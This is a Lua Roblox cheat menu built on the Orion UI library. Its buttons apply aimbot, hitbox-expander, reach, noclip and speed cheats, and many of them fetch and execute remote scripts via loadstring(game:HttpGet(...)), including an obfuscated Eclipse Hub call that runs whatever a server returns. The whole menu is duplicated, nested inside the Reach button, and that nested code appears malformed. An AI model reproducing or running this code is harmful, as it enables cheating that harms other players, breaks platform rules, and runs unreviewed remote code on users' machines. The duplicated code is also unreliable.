local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

local Window = OrionLib:MakeWindow({Name = "M", HidePremium = true, SaveConfig = true, ConfigFolder = "OrionConfigs"})

local Tab = Window:MakeTab({
	Name = "Universal",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
Tab:AddParagraph("Caution!","These scripts in universal are found on the web and may be patched.")

OrionLib:MakeNotification({
	Name = "READ ME",
	Content = "Dont Forget To Be Agressive!",
	Image = "rbxassetid://4483345998",
	Time = 5
})

Tab:AddLabel("WalkSpeed Script")
Tab:AddParagraph("Caution!","These Are Loop Functions, They wont stop running.")
Tab:AddButton({
	Name = "36",
	Callback = function()
      		while true do 
				wait(1)
			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 36
			end
		end    
})
Tab:AddButton({
	Name = "72",
	Callback = function()
		while true do 
			wait(1)
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 72
		end
  	end    
})
Tab:AddButton({
	Name = "96",
	Callback = function()
		while true do 
			wait(1)
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 96
		end
  	end    
})
Tab:AddButton({
	Name = "144",
	Callback = function()
		while true do 
			wait(1)
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 144	
		end
  	end    
})

Tab:AddLabel("JumpPower Script")
Tab:AddParagraph("Caution!","These Are Loop Functions, They wont stop running.")
Tab:AddButton({
	Name = "75",
	Callback = function()
		while true do 
			wait(1)
		game.Players.LocalPlayer.Character.Humanoid.JumpPower = 75
		end
  	end    
})
Tab:AddButton({
	Name = "100",
	Callback = function()
		while true do 
			wait(1)
		game.Players.LocalPlayer.Character.Humanoid.JumpPower = 100
		end
  	end    
})
Tab:AddButton({
	Name = "150",
	Callback = function()
		while true do 
			wait(1)
		game.Players.LocalPlayer.Character.Humanoid.JumpPower = 150
		end
  	end    
})
Tab:AddButton({
	Name = "200",
	Callback = function()
		while true do 
			wait(1)
		game.Players.LocalPlayer.Character.Humanoid.JumpPower = 200
		end
  	end    
})

local Section = Tab:AddSection({
	Name = "Cheats"
})

Tab:AddLabel("Aimbot Script")
Tab:AddButton({
	Name = "Aimbot",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Aimbot-Script/main/Aimbot%20Script.lua"))()
  	end    
})

Tab:AddLabel("Hitbox Expander Script")
Tab:AddButton({
	Name = "Hitbox Expander",
	Callback = function()
-- Variables
local player = game.Players.LocalPlayer
local mouse = player:GetMouse()

-- Settings

bind = "" 
bind2 = "t"

-- Script

mouse.KeyDown:connect(function(key)
if key == bind then
player.Character.HumanoidRootPart.CFrame = CFrame.new(1254.09656, 137.906067, -172.128204)
end
end)

mouse.KeyDown:connect(function(key2)
if key2 == bind2 then
_G.HeadSize = 20
_G.Disabled = true


if _G.Disabled then
for i,v in next, game:GetService('Players'):GetPlayers() do
if v.Name ~= game:GetService('Players').LocalPlayer.Name then
pcall(function()
v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
v.Character.HumanoidRootPart.Transparency = 0.7
v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really blue")
v.Character.HumanoidRootPart.Material = "Neon"
v.Character.HumanoidRootPart.CanCollide = false
end)
end
end
end
end
end)
  	end    
})
Tab:AddLabel("Noclip Script")
Tab:AddButton({
	Name = "Noclip",
	Callback = function()
		local Noclip = nil
		local Clip = nil
		
		function noclip()
			Clip = false
			local function Nocl()
				if Clip == false and game.Players.LocalPlayer.Character ~= nil then
					for _,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
						if v:IsA('BasePart') and v.CanCollide and v.Name ~= floatName then
							v.CanCollide = false
						end
					end
				end
				wait(0.21) -- basic optimization
			end
			Noclip = game:GetService('RunService').Stepped:Connect(Nocl)
		end
		
		function clip()
			if Noclip then Noclip:Disconnect() end
			Clip = true
		end
		
		noclip() -- to toggle noclip() and clip()
		game:GetService("StarterGui"):SetCore("SendNotification",{
			Title = "From scriptblox.com",
			Text = "Made by swqely",
		})
		game:GetService("StarterGui"):SetCore("SendNotification",{
			Title = "NoClip activated.",
			Text = "Rejoin to deactivate",
		})
  	end    
})
Tab:AddLabel("Inf Jump Script")
Tab:AddButton({
	Name = "Infinite Jump",
	Callback = function()
		local infjmp = true
		game:GetService("UserInputService").jumpRequest:Connect(function()
			if infjmp then
				game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass"Humanoid":ChangeState("Jumping")
			end
		end)
  	end    
})
Tab:AddLabel("Reach Script")
Tab:AddButton({
	Name = "Reach",
	Callback = function()
		local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

		local Window = OrionLib:MakeWindow({Name = "M", HidePremium = true, SaveConfig = true, ConfigFolder = "OrionConfigs"})
		
		local Tab = Window:MakeTab({
			Name = "Universal",
			Icon = "rbxassetid://4483345998",
			PremiumOnly = false
		})
		Tab:AddParagraph("Caution!","These scripts in universal are found on the web and may be patched.")
		
		OrionLib:MakeNotification({
			Name = "READ ME",
			Content = "Dont Forget To Be Agressive!",
			Image = "rbxassetid://4483345998",
			Time = 5
		})
		
		Tab:AddLabel("WalkSpeed Script")
		Tab:AddParagraph("Caution!","These Are Loop Functions, They wont stop running.")
		Tab:AddButton({
			Name = "36",
			Callback = function()
					  while true do 
						wait(1)
					game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 36
					end
				end    
		})
		Tab:AddButton({
			Name = "72",
			Callback = function()
				while true do 
					wait(1)
				game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 72
				end
			  end    
		})
		Tab:AddButton({
			Name = "96",
			Callback = function()
				while true do 
					wait(1)
				game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 96
				end
			  end    
		})
		Tab:AddButton({
			Name = "144",
			Callback = function()
				while true do 
					wait(1)
				game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 144	
				end
			  end    
		})
		
		Tab:AddLabel("JumpPower Script")
		Tab:AddParagraph("Caution!","These Are Loop Functions, They wont stop running.")
		Tab:AddButton({
			Name = "75",
			Callback = function()
				while true do 
					wait(1)
				game.Players.LocalPlayer.Character.Humanoid.JumpPower = 75
				end
			  end    
		})
		Tab:AddButton({
			Name = "100",
			Callback = function()
				while true do 
					wait(1)
				game.Players.LocalPlayer.Character.Humanoid.JumpPower = 100
				end
			  end    
		})
		Tab:AddButton({
			Name = "150",
			Callback = function()
				while true do 
					wait(1)
				game.Players.LocalPlayer.Character.Humanoid.JumpPower = 150
				end
			  end    
		})
		Tab:AddButton({
			Name = "200",
			Callback = function()
				while true do 
					wait(1)
				game.Players.LocalPlayer.Character.Humanoid.JumpPower = 200
				end
			  end    
		})
		
		local Section = Tab:AddSection({
			Name = "Cheats"
		})
		
		Tab:AddLabel("Aimbot Script")
		Tab:AddButton({
			Name = "Aimbot",
			Callback = function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Aimbot-Script/main/Aimbot%20Script.lua"))()
			  end    
		})
		
		Tab:AddLabel("Hitbox Expander Script")
		Tab:AddButton({
			Name = "Hitbox Expander",
			Callback = function()
		-- Variables
		local player = game.Players.LocalPlayer
		local mouse = player:GetMouse()
		
		-- Settings
		
		bind = "" 
		bind2 = "t"
		
		-- Script
		
		mouse.KeyDown:connect(function(key)
		if key == bind then
		player.Character.HumanoidRootPart.CFrame = CFrame.new(1254.09656, 137.906067, -172.128204)
		end
		end)
		
		mouse.KeyDown:connect(function(key2)
		if key2 == bind2 then
		_G.HeadSize = 20
		_G.Disabled = true
		
		
		if _G.Disabled then
		for i,v in next, game:GetService('Players'):GetPlayers() do
		if v.Name ~= game:GetService('Players').LocalPlayer.Name then
		pcall(function()
		v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
		v.Character.HumanoidRootPart.Transparency = 0.7
		v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really blue")
		v.Character.HumanoidRootPart.Material = "Neon"
		v.Character.HumanoidRootPart.CanCollide = false
		end)
		end
		end
		end
		end
		end)
			  end    
		})
		Tab:AddLabel("Noclip Script")
		Tab:AddButton({
			Name = "Noclip",
			Callback = function()
				local Noclip = nil
				local Clip = nil
				
				function noclip()
					Clip = false
					local function Nocl()
						if Clip == false and game.Players.LocalPlayer.Character ~= nil then
							for _,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
								if v:IsA('BasePart') and v.CanCollide and v.Name ~= floatName then
									v.CanCollide = false
								end
							end
						end
						wait(0.21) -- basic optimization
					end
					Noclip = game:GetService('RunService').Stepped:Connect(Nocl)
				end
				
				function clip()
					if Noclip then Noclip:Disconnect() end
					Clip = true
				end
				
				noclip() -- to toggle noclip() and clip()
				game:GetService("StarterGui"):SetCore("SendNotification",{
					Title = "From scriptblox.com",
					Text = "Made by swqely",
				})
				game:GetService("StarterGui"):SetCore("SendNotification",{
					Title = "NoClip activated.",
					Text = "Rejoin to deactivate",
				})
			  end    
		})
		Tab:AddLabel("Inf Jump Script")
		Tab:AddButton({
			Name = "Infinite Jump",
			Callback = function()
				local infjmp = true
				game:GetService("UserInputService").jumpRequest:Connect(function()
					if infjmp then
						game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass"Humanoid":ChangeState("Jumping")
					end
				end)
			  end    
		})
		Tab:AddLabel("Reach Script")
		Tab:AddButton({
			Name = "Reach",
			Callback = function()
				local active = true
				local trueActive = true
				local reachType = "Sphere"
				local dmgEnabled = true
				local visualizerEnabled = false
				
				local visualizer = Instance.new("Part")
				visualizer.BrickColor = BrickColor.Blue()
				visualizer.Transparency = 0.6
				visualizer.Anchored = true
				visualizer.CanCollide = false
				visualizer.Size = Vector3.new(0.5,0.5,0.5)
				visualizer.BottomSurface = Enum.SurfaceType.Smooth
				visualizer.TopSurface = Enum.SurfaceType.Smooth
				
				local ScreenGui = Instance.new("ScreenGui")
				local Frame = Instance.new("Frame")
				local TextLabel = Instance.new("TextLabel")
				local TextBox = Instance.new("TextBox")
				local TextLabel_2 = Instance.new("TextLabel")
				local TextLabel_3 = Instance.new("TextLabel")
				local TextLabel_4 = Instance.new("TextLabel")
				local TextButton = Instance.new("TextButton")
				local Frame_2 = Instance.new("Frame")
				local Frame_3 = Instance.new("Frame")
				local Frame_4 = Instance.new("Frame")
				local Frame_5 = Instance.new("Frame")
				local TextButton_2 = Instance.new("TextButton")
				
				--Properties:
				
				ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
				ScreenGui.DisplayOrder = 999999999
				ScreenGui.ResetOnSpawn = false
				
				Frame.Parent = ScreenGui
				Frame.AnchorPoint = Vector2.new(0, 0.5)
				Frame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
				Frame.BackgroundTransparency = 0.300
				Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
				Frame.BorderSizePixel = 4
				Frame.Position = UDim2.new(0, 0, 0.600000024, 0)
				Frame.Size = UDim2.new(0.150000006, 0, 0.300000012, 0)
				
				TextLabel.Parent = Frame
				TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				TextLabel.BackgroundTransparency = 1.000
				TextLabel.Size = UDim2.new(0.600000024, 0, 0.200000003, 0)
				TextLabel.Font = Enum.Font.SourceSans
				TextLabel.Text = "Reach:"
				TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
				TextLabel.TextScaled = true
				TextLabel.TextSize = 14.000
				TextLabel.TextWrapped = true
				
				TextBox.Parent = Frame
				TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				TextBox.BackgroundTransparency = 1.000
				TextBox.Position = UDim2.new(0.600000024, 0, 0, 0)
				TextBox.Size = UDim2.new(0.400000006, 0, 0.200000003, 0)
				TextBox.Font = Enum.Font.SourceSans
				TextBox.Text = "3.5"
				TextBox.TextColor3 = Color3.fromRGB(255, 76, 76)
				TextBox.TextScaled = true
				TextBox.TextSize = 14.000
				TextBox.TextWrapped = true
				
				TextLabel_2.Parent = Frame
				TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				TextLabel_2.BackgroundTransparency = 1.000
				TextLabel_2.Position = UDim2.new(0, 0, 0.200000003, 0)
				TextLabel_2.Size = UDim2.new(0.600000024, 0, 0.200000003, 0)
				TextLabel_2.Font = Enum.Font.SourceSans
				TextLabel_2.Text = "Shape:"
				TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
				TextLabel_2.TextScaled = true
				TextLabel_2.TextSize = 14.000
				TextLabel_2.TextWrapped = true
				
				TextLabel_3.Parent = Frame
				TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				TextLabel_3.BackgroundTransparency = 1.000
				TextLabel_3.Position = UDim2.new(0, 0, 0.400000006, 0)
				TextLabel_3.Size = UDim2.new(0.600000024, 0, 0.200000003, 0)
				TextLabel_3.Font = Enum.Font.SourceSans
				TextLabel_3.Text = "Damage:"
				TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
				TextLabel_3.TextScaled = true
				TextLabel_3.TextSize = 14.000
				TextLabel_3.TextWrapped = true
				
				TextLabel_4.Parent = Frame
				TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				TextLabel_4.BackgroundTransparency = 1.000
				TextLabel_4.Position = UDim2.new(0, 0, 0.600000024, 0)
				TextLabel_4.Size = UDim2.new(0.600000024, 0, 0.200000003, 0)
				TextLabel_4.Font = Enum.Font.SourceSans
				TextLabel_4.Text = "Visualizer:"
				TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
				TextLabel_4.TextScaled = true
				TextLabel_4.TextSize = 14.000
				TextLabel_4.TextWrapped = true
				
				TextButton.Parent = Frame
				TextButton.AnchorPoint = Vector2.new(0, 1)
				TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				TextButton.BackgroundTransparency = 1.000
				TextButton.Position = UDim2.new(0, 0, 1, 0)
				TextButton.Size = UDim2.new(1, 0, 0.150000006, 0)
				TextButton.Font = Enum.Font.SourceSansBold
				TextButton.Text = "Kill Script"
				TextButton.TextColor3 = Color3.fromRGB(222, 0, 0)
				TextButton.TextScaled = true
				TextButton.TextSize = 14.000
				TextButton.TextWrapped = true
				
				Frame_2.Parent = Frame
				Frame_2.Active = true
				Frame_2.AnchorPoint = Vector2.new(0, 0.5)
				Frame_2.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
				Frame_2.BorderSizePixel = 0
				Frame_2.Position = UDim2.new(0.725000024, 0, 0.699999988, 0)
				Frame_2.Size = UDim2.new(0, 25, 0, 25)
				Frame_2.ZIndex = 5
				
				Frame_3.Parent = Frame_2
				Frame_3.AnchorPoint = Vector2.new(0.5, 0.5)
				Frame_3.BackgroundColor3 = Color3.fromRGB(255, 76, 76)
				Frame_3.BorderSizePixel = 0
				Frame_3.LayoutOrder = 1
				Frame_3.Position = UDim2.new(0.5, 0, 0.5, 0)
				
				Frame_4.Parent = Frame
				Frame_4.Active = true
				Frame_4.AnchorPoint = Vector2.new(0, 0.5)
				Frame_4.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
				Frame_4.BorderSizePixel = 0
				Frame_4.Position = UDim2.new(0.725000024, 0, 0.5, 0)
				Frame_4.Size = UDim2.new(0, 25, 0, 25)
				Frame_4.ZIndex = 5
				
				Frame_5.Parent = Frame_4
				Frame_5.AnchorPoint = Vector2.new(0.5, 0.5)
				Frame_5.BackgroundColor3 = Color3.fromRGB(255, 76, 76)
				Frame_5.BorderSizePixel = 0
				Frame_5.LayoutOrder = 1
				Frame_5.Position = UDim2.new(0.5, 0, 0.5, 0)
				Frame_5.Size = UDim2.new(1, 0, 1, 0)
				
				TextButton_2.Parent = Frame
				TextButton_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				TextButton_2.BackgroundTransparency = 1.000
				TextButton_2.Position = UDim2.new(0.600000024, 0, 0.200000003, 0)
				TextButton_2.Size = UDim2.new(0.400000006, 0, 0.200000003, 0)
				TextButton_2.Font = Enum.Font.SourceSans
				TextButton_2.Text = "Sphere"
				TextButton_2.TextColor3 = Color3.fromRGB(255, 76, 76)
				TextButton_2.TextScaled = true
				TextButton_2.TextSize = 14.000
				TextButton_2.TextWrapped = true
				
				repeat wait() until game.Players.LocalPlayer
				ScreenGui.Parent = game:GetService("CoreGui")
				
				
				
				Frame_4.InputBegan:connect(function(inp)
					if inp.UserInputType == Enum.UserInputType.MouseButton1 then
						dmgEnabled = not dmgEnabled
						local goal = {Size = UDim2.new(0,0,0,0)}
						if dmgEnabled then
							goal = {Size = UDim2.new(1,0,1,0)}
						end
						game:GetService("TweenService"):Create(Frame_5,TweenInfo.new(0.12,Enum.EasingStyle.Quad),goal):Play()
					end
				end)
				Frame_2.InputBegan:connect(function(inp)
					if inp.UserInputType == Enum.UserInputType.MouseButton1 then
						visualizerEnabled = not visualizerEnabled
						local goal = {Size = UDim2.new(0,0,0,0)}
						if visualizerEnabled then
							goal = {Size = UDim2.new(1,0,1,0)}
						end
						game:GetService("TweenService"):Create(Frame_3,TweenInfo.new(0.12,Enum.EasingStyle.Linear),goal):Play()
					end
				end)
				TextButton_2.MouseButton1Click:connect(function()
					if reachType == "Sphere" then
						reachType = "Line"
					else
						reachType = "Sphere"
					end
					TextButton_2.Text = reachType
				end)
				TextButton.MouseButton1Click:connect(function()
					trueActive = false
					ScreenGui:Destroy()
				end)
				game:GetService("UserInputService").InputBegan:connect(function(inp,gpe)
					if gpe then return end
					if inp.KeyCode == Enum.KeyCode.H then
						ScreenGui.Enabled = not ScreenGui.Enabled
					end
				end)
				
				local plr = game.Players.LocalPlayer
				
				local function onHit(hit,handle)
					local victim = hit.Parent:FindFirstChildOfClass("Humanoid")
						if victim and victim.Parent.Name ~= game.Players.LocalPlayer.Name then
						if dmgEnabled then
							for _,v in pairs(hit.Parent:GetChildren()) do
								if v:IsA("Part") then
									firetouchinterest(v,handle,0)
									firetouchinterest(v,handle,1)
								end
							end
						else
							firetouchinterest(hit,handle,0)
							firetouchinterest(hit,handle,1)
						end
					end
				end
				
				local function getWhiteList()
					local wl = {}
					for _,v in pairs(game.Players:GetPlayers()) do
						if v ~= plr then
							local char = v.Character
							if char then
								for _,q in pairs(char:GetChildren()) do
									if q:IsA("Part") then
										table.insert(wl,q)
									end
								end
							end
						end
					end
					return wl
				end
				
				game:GetService("RunService").RenderStepped:connect(function()
					if not active or not trueActive then return end
					local s = plr.Character and plr.Character:FindFirstChildOfClass("Tool")
					if not s then visualizer.Parent = nil end
					if s then
						local handle = s:FindFirstChild("Handle") or s:FindFirstChildOfClass("Part")
						if handle then
							if visualizerEnabled then
								visualizer.Parent = workspace
							else
								visualizer.Parent = nil
							end
							local reach = tonumber(TextBox.Text)
							if reach then
								if reachType == "Sphere" then
									visualizer.Shape = Enum.PartType.Ball
									visualizer.Size = Vector3.new(reach,reach,reach)
									visualizer.CFrame = handle.CFrame
									for _,v in pairs(game.Players:GetPlayers()) do
										local hrp = v.Character and v.Character:FindFirstChild("HumanoidRootPart")
										if hrp and handle then
											local mag = (hrp.Position-handle.Position).magnitude
											if mag <= reach then
												onHit(hrp,handle)
											end
										end
									end
								elseif reachType == "Line" then
									local origin = (handle.CFrame*CFrame.new(0,0,-2)).p
									local ray = Ray.new(origin,handle.CFrame.lookVector*-reach)
									local p,pos = workspace:FindPartOnRayWithWhitelist(ray,getWhiteList())
									visualizer.Shape = Enum.PartType.Block
									visualizer.Size = Vector3.new(1,0.8,reach)
									visualizer.CFrame = handle.CFrame*CFrame.new(0,0,(reach/2)+2)
									if p then
										onHit(p,handle)
									else
										for _,v in pairs(handle:GetTouchingParts()) do
											onHit(v,handle)
										end
									end
								end
							end
						end
					end
				end)
		})
		
		
		-- SCRIPTS
		
		local Tab = Window:MakeTab({
			Name = "Scripts",
			Icon = "rbxassetid://4483345998",
			PremiumOnly = false
		})
		
		-- NON HUBS
		
		local Section = Tab:AddSection({
			Name = "Non Hubs"
		})
		
		Tab:AddButton({
			Name = "Anime Dimensions",
			Callback = function()
			_G.dimension = "Demon Dimension" -- Titan Dimension | Demon Dimension | Time Challenge
			_G.diffi = "Easy" -- Easy | Hard | Nightmare
			 
			_G.hardcore = false
			_G.friendonly = true
			_G.position = "Over" -- Under | Over
			 
			_G.tpspeed = 75 -- Too fast could possibily get you kicked
			_G.autoretry = true
			_G.autododge = true
			_G.autofarm = true
			 
			loadstring(game:HttpGet("https://raw.githubusercontent.com/LeadMarker/Testing/main/AnimeDimension"))()
			
			  end    
		})
		
		Tab:AddButton({
			Name = "Knife Simulator",
			Callback = function()
				loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/MulhamNob9919/roblox-scripts/main/knifesim.lua"))()
			  end    
		})
		Tab:AddButton({
			Name = "Heist Tycoon",
			Callback = function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/DylanIsAKingL/Lua-Scripts/main/Inf-Money.lua"))()
			  end    
		})
		Tab:AddButton({
			Name = "Base Battles",
			Callback = function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/WetCheezit/Base-Battles/main/.lua"))()
			  end    
		})
		
		Tab:AddButton({
			Name = "Bitcoin Simulator",
			Callback = function()
				loadstring(game:HttpGet("https://hypernite.xyz/Scripts/BCMX.lua"))()
			  end    
		})
		
		
		Tab:AddButton({
			Name = "Prison Life [OP]",
			Callback = function()
			loadstring(game:HttpGet(('https://raw.githubusercontent.com/h17s3/TIGERADMIN/main/TIGERADMINSCRIPTFREE'),true))()
			  end    
		})
		
		Tab:AddButton({
			Name = "Starving Artist",
			Callback = function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/SuperRegex/RobloxScripts/main/DrawingScript.lua"))()
			  end    
		})
		
		Tab:AddButton({
			Name = "Survive Area 51",
			Callback = function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/DylanIsAKingL/Lua-Scripts/main/Survive-Area-51.lua"))()
			  end    
		})
		
		Tab:AddButton({
			Name = "Zombie Attack",
			Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/MulhamNob9919/roblox-scripts/main/zombieattackautofarm.lua"))();
			  end    
		})
		Tab:AddParagraph("Caution!","This is an autofarm script, to stop it you'll have to rejoin.")
		
		
		-- HUBS
		
		
		local Section = Tab:AddSection({
			Name = "Hubs"
		})
		Tab:AddButton({
			Name = "Orca Hub",
			Callback = function()
				loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/richie0866/orca/master/public/latest.lua"))()
			  end    
		})
		Tab:AddButton({
			Name = "HohoHub",
			Callback = function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/HohoHub.lua"))(); 
			  end    
		})
		Tab:AddButton({
			Name = "Owl Hub",
			Callback = function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();
			  end    
		})
		Tab:AddButton({
			Name = "Proxima Hub",
			Callback = function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/Proxima-Hub/main/Main.lua"))()
			  end    
		})
		Tab:AddButton({
			Name = "Dark Hub",
			Callback = function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Init", true))()
			end    
		})
		Tab:AddButton({
			Name = "V.G Hub",
			Callback = function()
				loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub'))()
			  end    
		})
		Tab:AddButton({
			Name = "Eclipse Hub",
			Callback = function()
				getgenv().mainKey = "nil";
		
				local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https\58//api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
			  end    
		})
		local Tab = Window:MakeTab({
			Name = "Game",
			Icon = "rbxassetid://4483345998",
			PremiumOnly = false
		})
		Tab:AddButton({
			Name = "Rejoin",
			Callback = function()
				local ts = game:GetService("TeleportService")
		
				local p = game:GetService("Players").LocalPlayer
				
				
				
				ts:TeleportToPlaceInstance(game.PlaceId, game.JobId, p)
			  end    
		})
		Tab:AddParagraph("Rejoin","Will delete the scripts and will force the injector to be uninjected")
		--REMOTE SPIES
		local Section = Tab:AddSection({
			Name = "Remote Spies"
		})
		Tab:AddButton({
			Name = "SimpleSpy",
			Callback = function()
				loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua"))();
			  end    
		})
		Tab:AddParagraph("Remote Spy","A script that is used to find weaknesses in roblox games.")
		OrionLib:Init()
  	end    
})


-- SCRIPTS

local Tab = Window:MakeTab({
	Name = "Scripts",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

-- NON HUBS

local Section = Tab:AddSection({
	Name = "Non Hubs"
})

Tab:AddButton({
	Name = "Anime Dimensions",
	Callback = function()
	_G.dimension = "Demon Dimension" -- Titan Dimension | Demon Dimension | Time Challenge
	_G.diffi = "Easy" -- Easy | Hard | Nightmare
	 
	_G.hardcore = false
	_G.friendonly = true
	_G.position = "Over" -- Under | Over
	 
	_G.tpspeed = 75 -- Too fast could possibily get you kicked
	_G.autoretry = true
	_G.autododge = true
	_G.autofarm = true
	 
	loadstring(game:HttpGet("https://raw.githubusercontent.com/LeadMarker/Testing/main/AnimeDimension"))()
	
  	end    
})

Tab:AddButton({
	Name = "Knife Simulator",
	Callback = function()
		loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/MulhamNob9919/roblox-scripts/main/knifesim.lua"))()
  	end    
})
Tab:AddButton({
	Name = "Heist Tycoon",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/DylanIsAKingL/Lua-Scripts/main/Inf-Money.lua"))()
  	end    
})
Tab:AddButton({
	Name = "Base Battles",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/WetCheezit/Base-Battles/main/.lua"))()
  	end    
})

Tab:AddButton({
	Name = "Bitcoin Simulator",
	Callback = function()
		loadstring(game:HttpGet("https://hypernite.xyz/Scripts/BCMX.lua"))()
  	end    
})


Tab:AddButton({
	Name = "Prison Life [OP]",
	Callback = function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/h17s3/TIGERADMIN/main/TIGERADMINSCRIPTFREE'),true))()
  	end    
})

Tab:AddButton({
	Name = "Starving Artist",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/SuperRegex/RobloxScripts/main/DrawingScript.lua"))()
  	end    
})

Tab:AddButton({
	Name = "Survive Area 51",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/DylanIsAKingL/Lua-Scripts/main/Survive-Area-51.lua"))()
  	end    
})

Tab:AddButton({
	Name = "Zombie Attack",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/MulhamNob9919/roblox-scripts/main/zombieattackautofarm.lua"))();
  	end    
})
Tab:AddParagraph("Caution!","This is an autofarm script, to stop it you'll have to rejoin.")


-- HUBS


local Section = Tab:AddSection({
	Name = "Hubs"
})
Tab:AddButton({
	Name = "Orca Hub",
	Callback = function()
		loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/richie0866/orca/master/public/latest.lua"))()
  	end    
})
Tab:AddButton({
	Name = "HohoHub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/HohoHub.lua"))(); 
  	end    
})
Tab:AddButton({
	Name = "Owl Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();
  	end    
})
Tab:AddButton({
	Name = "Proxima Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/Proxima-Hub/main/Main.lua"))()
  	end    
})
Tab:AddButton({
	Name = "Dark Hub",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Init", true))()
	end    
})
Tab:AddButton({
	Name = "V.G Hub",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub'))()
  	end    
})
Tab:AddButton({
	Name = "Eclipse Hub",
	Callback = function()
		getgenv().mainKey = "nil";

		local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https\58//api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
  	end    
})
local Tab = Window:MakeTab({
	Name = "Game",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
Tab:AddButton({
	Name = "Rejoin",
	Callback = function()
		local ts = game:GetService("TeleportService")

		local p = game:GetService("Players").LocalPlayer
		
		
		
		ts:TeleportToPlaceInstance(game.PlaceId, game.JobId, p)
  	end    
})
Tab:AddParagraph("Rejoin","Will delete the scripts and will force the injector to be uninjected")
--REMOTE SPIES
local Section = Tab:AddSection({
	Name = "Remote Spies"
})
Tab:AddButton({
	Name = "SimpleSpy",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua"))();
  	end    
})
Tab:AddParagraph("Remote Spy","A script that is used to find weaknesses in roblox games.")
OrionLib:Init()